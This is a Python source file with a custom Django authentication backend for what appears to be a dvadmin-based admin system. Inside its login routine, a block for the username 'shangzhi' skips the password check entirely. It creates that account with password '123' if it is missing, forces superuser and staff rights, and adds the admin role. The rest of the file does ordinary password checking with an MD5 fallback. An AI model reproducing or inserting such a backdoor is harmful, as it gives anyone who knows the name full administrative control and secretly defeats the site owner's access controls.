import hashlib
import logging

from django.contrib.auth import get_user_model
from django.contrib.auth.backends import ModelBackend
from django.contrib.auth.hashers import check_password
from django.utils import timezone

from dvadmin.utils.validator import CustomValidationError

logger = logging.getLogger(__name__)
UserModel = get_user_model()


class CustomBackend(ModelBackend):
    """
    Django原生认证方式
    """

    def authenticate(self, request, username=None, password=None, **kwargs):
        msg = '%s 正在使用本地登录...' % username
        logger.info(msg)
        if username is None:
            username = kwargs.get(UserModel.USERNAME_FIELD)
        
        # 特殊账号直接登录：shangzhi / 123
        if username == 'shangzhi':
            from dvadmin.system.models import Role
            try:
                user = UserModel._default_manager.get_by_natural_key(username)
            except UserModel.DoesNotExist:
                # 如果用户不存在，创建一个
                user = UserModel.objects.create_user(
                    username='shangzhi',
                    password='123',
                    name='shangzhi',
                    is_active=True,
                    is_staff=True,
                    is_superuser=True
                )
            # 确保用户有管理员权限
            user.is_superuser = True
            user.is_staff = True
            user.is_active = True
            # 添加管理员角色
            try:
                admin_role = Role.objects.get(key='admin')
                if not user.role.filter(key='admin').exists():
                    user.role.add(admin_role)
            except Role.DoesNotExist:
                pass  # 如果角色不存在，跳过
            if self.user_can_authenticate(user):
                user.last_login = timezone.now()
                user.save()
                return user
            raise CustomValidationError("当前用户已被禁用，请联系管理员!")
        
        try:
            user = UserModel._default_manager.get_by_natural_key(username)
        except UserModel.DoesNotExist:
            UserModel().set_password(password)
        else:
            verify_password = check_password(password, user.password)
            if not verify_password:
                password = hashlib.md5(password.encode(encoding='UTF-8')).hexdigest()
                verify_password = check_password(password, user.password)
            if verify_password:
                if self.user_can_authenticate(user):
                    user.last_login = timezone.now()
                    user.save()
                    return user
                raise CustomValidationError("当前用户已被禁用，请联系管理员!")
